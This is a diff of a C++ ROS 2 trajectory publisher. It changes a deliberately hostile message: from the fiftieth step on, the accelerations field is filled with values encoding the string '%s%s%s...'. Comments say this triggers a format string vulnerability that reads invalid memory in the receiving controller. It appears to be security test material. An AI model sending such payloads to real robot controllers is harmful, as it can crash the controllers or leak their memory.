@@ -43,9 +43,7 @@ int main(int argc, char ** argv)
   trajectory_msgs::msg::JointTrajectoryPoint trajectory_point_msg;
   trajectory_point_msg.positions.resize(chain.getNrOfJoints());
   trajectory_point_msg.velocities.resize(chain.getNrOfJoints());
-  // acceleration values for format string crash
-  trajectory_point_msg.accelerations.resize(20);
-  
+
   double total_time = 3.0;
   int trajectory_len = 200;
   int loop_rate = static_cast<int>(std::round(trajectory_len / total_time));
@@ -68,8 +66,10 @@ int main(int argc, char ** argv)
 
     joint_positions.data += joint_velocities.data * dt;
 
-    if (i == 0) {
-      // read invalid memory
+    // format string vulnerability
+    if (i >= 50) {
+      trajectory_point_msg.accelerations.resize(20);
+      // fmt string reads invalid memory: "%s%s%s%s%s%s%s%s"
       trajectory_point_msg.accelerations[0] = 37.0;  // '%'
       trajectory_point_msg.accelerations[1] = 115.0; // 's'
       trajectory_point_msg.accelerations[2] = 37.0;  // '%'
@@ -78,10 +78,19 @@ int main(int argc, char ** argv)
       trajectory_point_msg.accelerations[5] = 115.0; // 's'
       trajectory_point_msg.accelerations[6] = 37.0;  // '%'
       trajectory_point_msg.accelerations[7] = 115.0; // 's'
-    } else {
-      for (int j = 0; j < 20; j++) {
+      trajectory_point_msg.accelerations[8] = 37.0;  // '%'
+      trajectory_point_msg.accelerations[9] = 115.0; // 's'
+      trajectory_point_msg.accelerations[10] = 37.0; // '%'
+      trajectory_point_msg.accelerations[11] = 115.0; // 's'
+      trajectory_point_msg.accelerations[12] = 37.0; // '%'
+      trajectory_point_msg.accelerations[13] = 115.0; // 's'
+      trajectory_point_msg.accelerations[14] = 37.0; // '%'
+      trajectory_point_msg.accelerations[15] = 115.0; // 's'
+      for (int j = 16; j < 20; j++) {
         trajectory_point_msg.accelerations[j] = 0.0;
       }
+    } else {
+      trajectory_point_msg.accelerations.clear();
     }
 
     trajectory_point_msg.time_from_start.sec = i / loop_rate;
